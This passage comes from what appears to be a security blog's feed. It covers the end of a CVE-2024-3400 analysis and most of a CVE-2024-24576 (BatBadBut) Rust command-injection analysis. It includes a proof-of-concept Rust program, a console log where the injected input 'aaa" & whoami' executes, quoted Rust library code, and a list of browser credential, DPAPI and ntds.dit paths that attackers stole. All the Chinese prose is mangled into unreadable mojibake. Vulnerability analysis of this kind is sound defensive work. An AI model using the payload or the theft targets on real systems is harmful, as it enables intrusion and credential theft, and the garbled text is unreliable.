/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h3 id="3-4-Lateral-Movement-amp-Data-theft"><a href="#3-4-Lateral-Movement-amp-Data-theft" class="headerlink" title="3.4 Lateral Movement &amp; Data theft"></a>3.4 Lateral Movement &amp; Data theft</h3><p>ä¿¡æ¯æ”¶é›†åŠçªƒå–ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Local State</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State</span><br><span class="line">%APPDATA%\Roaming\Microsoft\Protect\&lt;SID&gt; -&gt; DPAPI Keys</span><br><span class="line">%SystemRoot%\NTDS\ntds.dit</span><br><span class="line">%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</span><br></pre></td></tr></table></figure><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol><li><a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">https://security.paloaltonetworks.com/CVE-2024-3400</a></li><li><a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/</a></li><li><a href="https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami" target="_blank" rel="noopener">https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami</a></li><li><a href="https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis" target="_blank" rel="noopener">https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis</a></li><li><a href="https://github.com/gorilla/sessions/pull/274" target="_blank" rel="noopener">https://github.com/gorilla/sessions/pull/274</a></li><li><a href="https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls" target="_blank" rel="noopener">https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls</a></li><li><a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/</a></li><li><a href="https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡æ•´ç†äº†ç½‘ä¸Šå…³äº PAN-OS åœ¨é‡æ”»å‡»æ¼æ´ CVE-2024-3400 çš„å„ç§æŠ€æœ¯ç»†èŠ‚ä¿¡æ¯ï¼ŒåŒ…æ‹¬ &lt;strong&gt;Cookie ä¸­çš„è·¯å¾„ç©¿è¶Šæ¼æ´&lt;/strong&gt;å’Œ &lt;strong&gt;Telemetry ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´&lt;/strong&gt;çš„ç»„åˆåˆ©ç”¨ï¼Œä»¥åŠæ”»å‡»è€… Post-Exploitation ç›¸å…³çš„ç»†èŠ‚ä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒBishop Fox å‘ç°äº†æ–°çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå› æ­¤å¸¦æœ‰æ¼æ´çš„ç³»ç»Ÿä»…ä»…æ˜¯ç¦ç”¨ Telemetry æœåŠ¡æ˜¯æ²¡æœ‰ç”¨çš„ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Path Traversal" scheme="https://programlife.net/tags/Path-Traversal/"/>
    
      <category term="Command Injection" scheme="https://programlife.net/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-24576 Windows ä¸‹å¤šè¯­è¨€å‘½ä»¤æ³¨å…¥æ¼æ´åˆ†æ</title>
    <link href="https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/"/>
    <id>https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/</id>
    <published>2024-04-14T13:33:37.000Z</published>
    <updated>2024-04-14T15:50:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿‘æœŸæ¥è‡ª Flatt Security Inc. çš„ RyotaK æŠ«éœ²äº† Windows ä¸‹å¤šä¸ªç¼–ç¨‹è¯­è¨€çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆæ¼æ´è¢«å‘½åä¸º <strong>BatBadBut</strong>ï¼‰ï¼Œå…¶ä¸­ Rust è¯­è¨€å¯¹åº”çš„æ¼æ´ç¼–å·ä¸º CVE-2024-24576ï¼Œå› ä¸º Rust è¯­è¨€è‡ªå¸¦æµé‡å±æ€§ï¼Œå›½å†…å®‰å…¨/ç§‘æŠ€è‡ªåª’ä½“å¯èƒ½ä¼šä½¿ç”¨ä¸€äº›æ€ªå¼‚çš„æ ‡é¢˜æ¥è¿›è¡Œå®£ä¼ ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªæ¼æ´è·Ÿå†…å­˜å®‰å…¨æ²¡æœ‰å…³ç³»ï¼Œæ˜¯ Windows ä¸‹ <code>cmd.exe</code> å¯¹å‘½ä»¤è¡Œå‚æ•°çš„ç‰¹æ®Šè§£æé€»è¾‘æ‰€å¯¼è‡´çš„é€»è¾‘æ¼æ´ï¼›æ­¤å¤–ï¼Œè¿™ä¸ªæ¼æ´ä¹Ÿä¸ä»…ä»…å½±å“ Rustï¼Œåƒ PHPã€Python ç­‰è¯­è¨€å‡å—å½±å“ã€‚</p><a id="more"></a><h2 id="0x01-æ¼æ´ä»‹ç»"><a href="#0x01-æ¼æ´ä»‹ç»" class="headerlink" title="0x01. æ¼æ´ä»‹ç»"></a>0x01. æ¼æ´ä»‹ç»</h2><h3 id="1-1-CVE-2024-24576"><a href="#1-1-CVE-2024-24576" class="headerlink" title="1.1 CVE-2024-24576"></a>1.1 CVE-2024-24576</h3><p>å—å½±å“çš„ Rust ç‰ˆæœ¬ï¼šRust for Windows &lt; 1.77.2</p><blockquote><p>The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the <code>bat</code> and <code>cmd</code> extensions) on Windows using the <a href="https://doc.rust-lang.org/std/process/struct.Command.html" target="_blank" rel="noopener"><code>Command</code></a> API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.</p></blockquote><p>CWE åˆ†ç±»ä¿¡æ¯ï¼š</p><table><thead><tr><th style="text-align:left">CWE-ID</th><th style="text-align:left">CWE Name</th><th style="text-align:left">Source</th></tr></thead><tbody><tr><td style="text-align:left"><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78</a></td><td style="text-align:left">Improper Neutralization of Special Elements used in an OS Command (â€˜OS Command Injectionâ€™)</td><td style="text-align:left">GitHub, Inc.</td></tr><tr><td style="text-align:left"><a href="http://cwe.mitre.org/data/definitions/88.html" target="_blank" rel="noopener">CWE-88</a></td><td style="text-align:left">Improper Neutralization of Argument Delimiters in a Command (â€˜Argument Injectionâ€™)</td><td style="text-align:left">GitHub, Inc.</td></tr></tbody></table><h3 id="1-2-æ¼æ´å½±å“é¢"><a href="#1-2-æ¼æ´å½±å“é¢" class="headerlink" title="1.2 æ¼æ´å½±å“é¢"></a>1.2 æ¼æ´å½±å“é¢</h3><p>è¿™ä¸ªæ¼æ´åªå­˜åœ¨äº Windows ç³»ç»Ÿï¼Œä½†ä¸ä»…ä»…å½±å“ Rust è¯­è¨€ï¼Œåƒ PHPã€Pythonã€Node.js ç­‰å‡å—å½±å“ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå¦‚ä¸‹é¡µé¢ï¼š</p><ol><li>CERT/CC: <a href="https://www.kb.cert.org/vuls/id/123335" target="_blank" rel="noopener">Multiple programming languages fail to escape arguments properly in Microsoft Windows</a></li><li>Flatt Security Inc./RyotaK: <a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/" target="_blank" rel="noopener">BatBadBut: You canâ€™t securely execute commands on Windows</a></li></ol><h2 id="0x02-PoC-æµ‹è¯•"><a href="#0x02-PoC-æµ‹è¯•" class="headerlink" title="0x02. PoC æµ‹è¯•"></a>0x02. PoC æµ‹è¯•</h2><h3 id="2-1-Rust-ç¯å¢ƒæ­å»º"><a href="#2-1-Rust-ç¯å¢ƒæ­å»º" class="headerlink" title="2.1 Rust ç¯å¢ƒæ­å»º"></a>2.1 Rust ç¯å¢ƒæ­å»º</h3><p>ä»å®˜ç½‘ä¸‹è½½å¹¶è¿è¡Œ <code>rustup-init.exe</code>ï¼Œé»˜è®¤å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Rust å³ 1.77.2ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å®‰è£…å’Œåˆ‡æ¢ Rust ç‰ˆæœ¬ï¼š</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">rustup install <span class="number">1</span>.<span class="number">77</span>.<span class="number">1</span></span><br><span class="line">rustup default <span class="number">1</span>.<span class="number">77</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="2-2-æ¼æ´-PoC"><a href="#2-2-æ¼æ´-PoC" class="headerlink" title="2.2 æ¼æ´ PoC"></a>2.2 æ¼æ´ PoC</h3><p>è¿™ä¸ªæ¼æ´å¿…é¡»åœ¨æ‰§è¡Œ <code>.bat</code> æˆ–è€… <code>.cmd</code> æ–‡ä»¶çš„æ—¶å€™æ‰èƒ½è§¦å‘ï¼Œæ‰€ä»¥å…ˆå‡†å¤‡ä¸€ä¸ª <code>test.bat</code> æ‰¹å¤„ç†æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼ˆä½œç”¨æ˜¯æ‰“å°æ¥æ”¶çš„å‘½ä»¤è¡Œå‚æ•°ï¼‰ï¼š</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Argument received: %<span class="number">1</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç”¨çš„ Rust æ–‡ä»¶ <code>test.rs</code> çš„ä»£ç å¦‚ä¸‹ï¼ˆä½œç”¨æ˜¯é€šè¿‡ <code>Command</code> åˆ›å»ºå­è¿›ç¨‹æ¥è¿è¡Œ <code>test.bat</code>ï¼Œä½†æ˜¯å­è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ï¼‰ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Write&#125;;</span><br><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"enter payload here"</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> input = <span class="built_in">String</span>::new();</span><br><span class="line">    io::stdout().flush().expect(<span class="string">"Failed to flush stdout"</span>);</span><br><span class="line">    io::stdin().read_line(&amp;<span class="keyword">mut</span> input).expect(<span class="string">"Failed to read from stdin"</span>);</span><br><span class="line">    <span class="keyword">let</span> output = Command::new(<span class="string">"./test.bat"</span>)</span><br><span class="line">                    .arg(input.trim())</span><br><span class="line">                    .output()</span><br><span class="line">                    .expect(<span class="string">"Failed to execute command"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Output:\n&#123;&#125;"</span>, <span class="built_in">String</span>::from_utf8_lossy(&amp;output.stdout));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC æµ‹è¯•ï¼ˆç¼–è¯‘ <code>test.rs</code> å¹¶è¿è¡Œï¼‰ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">rustc</span> <span class="title">test.rs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: <span class="title">aaa</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span> &amp; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span> &amp; <span class="title">whoami</span>"</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span>" &amp; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span>\"</span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-618<span class="title">ia48</span>\<span class="title">ddw</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€åä¸€æ¬¡æµ‹è¯•æ—¶æˆåŠŸæ‰§è¡Œäº†æ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ <code>whoami</code>ã€‚</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03. æ¼æ´åˆ†æ"></a>0x03. æ¼æ´åˆ†æ</h2><p>æ ¹æ® <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2" target="_blank" rel="noopener">Rust 1.77.2 &amp; 1.77.1</a> Commit Diff å¯çŸ¥ï¼Œè¡¥ä¸ä½äºæ–‡ä»¶ <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2#diff-0f014cb9862d1103d90286b9b9227c5247e14585f796da7c1c189b008dbb6a1a" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs</a>ï¼Œä¸»è¦æ˜¯ä¿®å¤äº† <code>make_bat_command_line</code> å‡½æ•°ä¸­çš„å¤„ç†é€»è¾‘ï¼Œè¿™é‡ŒåŸºäº Rust 1.77.1 çš„ä»£ç å¼€å±•åˆ†æã€‚</p><h3 id="3-1-spawn"><a href="#3-1-spawn" class="headerlink" title="3.1 spawn"></a>3.1 spawn</h3><p>é¦–å…ˆæ‰¾åˆ°å‡½æ•° <code>make_bat_command_line</code> çš„ callerï¼Œä¸º <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/process.rs#L262" target="_blank" rel="noopener">library/std/src/sys/pal/windows/process.rs#L262</a> å¤„çš„ <code>spawn</code> å‡½æ•°ï¼Œå…¶æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">spawn</span></span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    <span class="keyword">default</span>: Stdio,</span><br><span class="line">    needs_stdin: <span class="built_in">bool</span>,</span><br><span class="line">) -&gt; io::<span class="built_in">Result</span>&lt;(Process, StdioPipes)&gt; &#123;</span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">    <span class="keyword">let</span> program = resolve_exe(&amp;<span class="keyword">self</span>.program, || env::var_os(<span class="string">"PATH"</span>), child_paths)?;</span><br><span class="line">    <span class="comment">// Case insensitive "ends_with" of UTF-16 encoded ".bat" or ".cmd"</span></span><br><span class="line">    <span class="keyword">let</span> is_batch_file = matches!(</span><br><span class="line">        program.len().checked_sub(<span class="number">5</span>).and_then(|i| program.get(i..)),</span><br><span class="line">        <span class="literal">Some</span>([<span class="number">46</span>, <span class="number">98</span> | <span class="number">66</span>, <span class="number">97</span> | <span class="number">65</span>, <span class="number">116</span> | <span class="number">84</span>, <span class="number">0</span>] | [<span class="number">46</span>, <span class="number">99</span> | <span class="number">67</span>, <span class="number">109</span> | <span class="number">77</span>, <span class="number">100</span> | <span class="number">68</span>, <span class="number">0</span>])</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">let</span> (program, <span class="keyword">mut</span> cmd_str) = <span class="keyword">if</span> is_batch_file &#123;</span><br><span class="line">        (</span><br><span class="line">            command_prompt()?,</span><br><span class="line">            args::make_bat_command_line(&amp;program, &amp;<span class="keyword">self</span>.args, <span class="keyword">self</span>.force_quotes_enabled)?,</span><br><span class="line">        )</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd_str = make_command_line(&amp;<span class="keyword">self</span>.program, &amp;<span class="keyword">self</span>.args, <span class="keyword">self</span>.force_quotes_enabled)?;</span><br><span class="line">        (program, cmd_str)</span><br><span class="line">    &#125;;</span><br><span class="line">    cmd_str.push(<span class="number">0</span>); <span class="comment">// add null terminator</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        cvt(c::CreateProcessW(</span><br><span class="line">            program.as_ptr(),</span><br><span class="line">            cmd_str.as_mut_ptr(),</span><br><span class="line">            ptr::null_mut(),</span><br><span class="line">            ptr::null_mut(),</span><br><span class="line">            c::TRUE,</span><br><span class="line">            flags,</span><br><span class="line">            envp,</span><br><span class="line">            dirp,</span><br><span class="line">            si_ptr,</span><br><span class="line">            &amp;<span class="keyword">mut</span> pi,</span><br><span class="line">        ))</span><br><span class="line">    &#125;?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè¦æ‰§è¡Œçš„æ–‡ä»¶çš„æ‰©å±•åï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ˜¯ <code>.bat</code> æˆ–è€… <code>.cmd</code>ï¼Œé‚£ä¹ˆ <code>CreateProcessW</code> çš„å‰ <code>2</code> ä¸ªå‚æ•°èµ°çš„æ˜¯å¦ä¸€å¥—é€»è¾‘ï¼š</p><ul><li><code>program</code> æ¥è‡ª <code>command_prompt()</code>ï¼Œå®é™…ä¸Šæ˜¯ <code>cmd.exe</code> çš„ç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œç•¥è¿‡ç»†èŠ‚</li><li><code>make_bat_command_line</code> è´Ÿè´£æ‹¼æ¥å‘½ä»¤è¡Œå‚æ•°ï¼Œæ˜¯éœ€è¦é‡ç‚¹åˆ†æçš„å‡½æ•°ï¼ˆå®é™…ä¸Šä¹Ÿæ˜¯åº”ç”¨è¡¥ä¸çš„å‡½æ•°ï¼‰</li></ul><p>å¦‚æœæ˜¯æ™®é€šçš„ç¨‹åºï¼Œåˆ™ <code>program</code> ä¸åšç‰¹æ®Šå¤„ç†ï¼Œè€Œå‘½ä»¤è¡Œå‚æ•°ç”± <code>make_command_line</code> è´Ÿè´£æ‹¼æ¥ã€‚</p><h3 id="3-2-make-command-line"><a href="#3-2-make-command-line" class="headerlink" title="3.2 make_command_line"></a>3.2 make_command_line</h3><p>å…ˆçœ‹çœ‹æ­£å¸¸çš„æ–‡ä»¶æ˜¯æ€ä¹ˆæ„å»ºå‘½ä»¤è¡Œå‚æ•°çš„ï¼Œå‡½æ•° <code>make_command_line</code> çš„ä»£ç å¦‚ä¸‹ï¼ˆ<a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/process.rs#L814" target="_blank" rel="noopener">library/std/src/sys/pal/windows/process.rs#L814</a>ï¼‰ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Produces a wide string *without terminating null*; returns an error if</span></span><br><span class="line"><span class="comment">// `prog` or any of the `args` contain a nul.</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">make_command_line</span></span>(argv0: &amp;OsStr, args: &amp;[Arg], force_quotes: <span class="built_in">bool</span>) -&gt; io::<span class="built_in">Result</span>&lt;<span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// Encode the command and arguments in a command line string such</span></span><br><span class="line">    <span class="comment">// that the spawned process may recover them using CommandLineToArgvW.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cmd: <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always quote the program name so CreateProcess to avoid ambiguity when</span></span><br><span class="line">    <span class="comment">// the child process parses its arguments.</span></span><br><span class="line">    <span class="comment">// Note that quotes aren't escaped here because they can't be used in arg0.</span></span><br><span class="line">    <span class="comment">// But that's ok because file paths can't contain quotes.</span></span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    cmd.extend(argv0.encode_wide());</span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args &#123;</span><br><span class="line">        cmd.push(<span class="string">' '</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">        args::append_arg(&amp;<span class="keyword">mut</span> cmd, arg, force_quotes)?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">Ok</span>(cmd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹ç¨‹åºè·¯å¾„æœ¬èº«ç›´æ¥ä½¿ç”¨åŒå¼•å· <code>&quot;</code> åŒ…å›´èµ·æ¥ï¼Œéšåé€šè¿‡ <code>args::append_arg</code> é™„åŠ å‚æ•°ã€‚</p><h3 id="3-3-append-arg"><a href="#3-3-append-arg" class="headerlink" title="3.3 append_arg"></a>3.3 append_arg</h3><p>å‡½æ•° <code>append_arg</code> ä½äº <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/args.rs#L219" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs#L219</a>ï¼ˆå’Œ <code>make_bat_command_line</code> ä½äºåŒä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿä¼šè¢« <code>make_bat_command_line</code> è°ƒç”¨ï¼‰ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">append_arg</span></span>(cmd: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;, arg: &amp;Arg, force_quotes: <span class="built_in">bool</span>) -&gt; io::<span class="built_in">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> (arg, quote) = <span class="keyword">match</span> arg &#123;</span><br><span class="line">        Arg::Regular(arg) =&gt; (arg, <span class="keyword">if</span> force_quotes &#123; Quote::Always &#125; <span class="keyword">else</span> &#123; Quote::Auto &#125;),</span><br><span class="line">        Arg::Raw(arg) =&gt; (arg, Quote::Never),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If an argument has 0 characters then we need to quote it to ensure</span></span><br><span class="line">    <span class="comment">// that it actually gets passed through on the command line or otherwise</span></span><br><span class="line">    <span class="comment">// it will be dropped entirely when parsed on the other end.</span></span><br><span class="line">    ensure_no_nuls(arg)?;</span><br><span class="line">    <span class="keyword">let</span> arg_bytes = arg.as_encoded_bytes();</span><br><span class="line">    <span class="keyword">let</span> (quote, escape) = <span class="keyword">match</span> quote &#123;</span><br><span class="line">        Quote::Always =&gt; (<span class="literal">true</span>, <span class="literal">true</span>),</span><br><span class="line">        Quote::Auto =&gt; &#123;</span><br><span class="line">            (arg_bytes.iter().any(|c| *c == <span class="string">b' '</span> || *c == <span class="string">b'\t'</span>) || arg_bytes.is_empty(), <span class="literal">true</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        Quote::Never =&gt; (<span class="literal">false</span>, <span class="literal">false</span>),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> quote &#123;</span><br><span class="line">        cmd.push(<span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> backslashes: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arg.encode_wide() &#123;</span><br><span class="line">        <span class="keyword">if</span> escape &#123;</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span> &#123;</span><br><span class="line">                backslashes += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> x == <span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span> &#123;</span><br><span class="line">                    <span class="comment">// Add n+1 backslashes to total 2n+1 before internal '"'.</span></span><br><span class="line">                    cmd.extend((<span class="number">0</span>..=backslashes).map(|_| <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                backslashes = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cmd.push(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quote &#123;</span><br><span class="line">        <span class="comment">// Add n backslashes to total 2n before ending '"'.</span></span><br><span class="line">        cmd.extend((<span class="number">0</span>..backslashes).map(|_| <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>));</span><br><span class="line">        cmd.push(<span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹å‚æ•°çš„å¤„ç†æœ‰å‡ ç§æ¨¡å¼ï¼š</p><ul><li>æ™®é€šå‚æ•°ï¼Œå³ <code>Command::arg</code> æˆ–è€… <code>Command::args</code>ï¼Œ<code>Quote</code> æœ‰ <code>Always</code> å’Œ <code>Auto</code> ä¸¤ç§æ¨¡å¼</li><li>åŸå§‹å‚æ•°ï¼Œå³ <code>CommandExt::raw_arg</code>ï¼Œ<code>Quote</code> æ˜¯ <code>Never</code></li></ul><p>å¯¹ Rust è€Œè¨€ï¼Œå¦‚æœä½¿ç”¨æ™®é€šå‚æ•°ï¼Œé‚£ä¹ˆ Rust ä¼šå¸®åŠ©å¯¹å‚æ•°å­—ç¬¦è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼›è€Œå¦‚æœä½¿ç”¨åŸå§‹å‚æ•°ï¼Œåˆ™å‚æ•°å­—ç¬¦çš„è½¬ä¹‰ç”±å¼€å‘è€…è‡ªå·±è´Ÿè´£ã€‚å¯¹ CVE-2024-24576 è¿™ä¸ªæ¼æ´è€Œè¨€ï¼Œæ˜¯æŒ‡ä½¿ç”¨æ™®é€šå‚æ•°çš„æƒ…å†µä¸‹ï¼ŒRust æ²¡æœ‰å¤„ç†å¥½å‚æ•°çš„è½¬ä¹‰ï¼Œå¯¼è‡´å¼•å‘äº†æ³¨å…¥æ¼æ´ã€‚æ‰€ä»¥è¿™é‡Œåªçœ‹æ™®é€šå‚æ•°çš„åœºæ™¯ï¼Œ<code>quote</code> å’Œ <code>escape</code> çš„å¯èƒ½å–å€¼å¦‚ä¸‹ï¼š</p><ul><li><code>Quote::Always</code> æ¨¡å¼<ul><li><code>quote = true</code></li><li><code>escape = true</code></li></ul></li><li><code>Quote::Auto</code> æ¨¡å¼<ul><li>å¦‚æœå‚æ•°å«æœ‰ç©ºæ ¼ç¬¦ <code></code> 